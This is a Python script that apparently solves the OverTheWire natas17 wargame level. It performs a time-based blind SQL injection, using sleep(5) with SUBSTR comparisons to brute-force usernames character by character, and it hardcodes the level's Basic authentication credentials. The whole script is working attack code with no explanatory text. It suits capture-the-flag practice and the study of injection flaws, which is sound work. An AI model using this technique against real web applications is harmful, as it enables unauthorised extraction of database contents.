#! /usr/bin/python3

import string
import sys
import time
import urllib.parse
import urllib.request


def main():
    chars = list(string.ascii_letters) + list(string.digits)

    url = 'http://natas17.natas.labs.overthewire.org/'
    headers = {
            'Authorization': 'Basic bmF0YXMxNzpFcWpISmJvN0xGTmI4dndoSGI5czc1aG9raDVURjBPQw=='
    }

    found = [
        ['']
    ]

    for i in range(32):
        print(f'Guessing at index {i + 1}')
        found.append([])
        for f in found[i]:
            print(f'  Starting with {f}')
            for c in chars:
                condition  =  'admin" OR (select sleep(5) from users '
                condition += f'where SUBSTR(username,1,{i+1}) = BINARY '
                condition += f"'{f + c}')#"

                data = 'username=' + urllib.parse.quote(condition)
                data = data.encode()

                req = urllib.request.Request(
                    url + '?debug=',
                    headers=headers, data=data)

                start_time = time.time()
                resp = urllib.request.urlopen(req)
                end_time = time.time()

                if resp.status != 200:
                    print('Received an unexpected error')
                    sys.exit(1)
                else:
                    time_difference = end_time - start_time
                    if time_difference > 2:
                        found[i + 1].append(f + c)
                        print(f'    Found {f + c}')


if __name__ == "__main__":
    main()
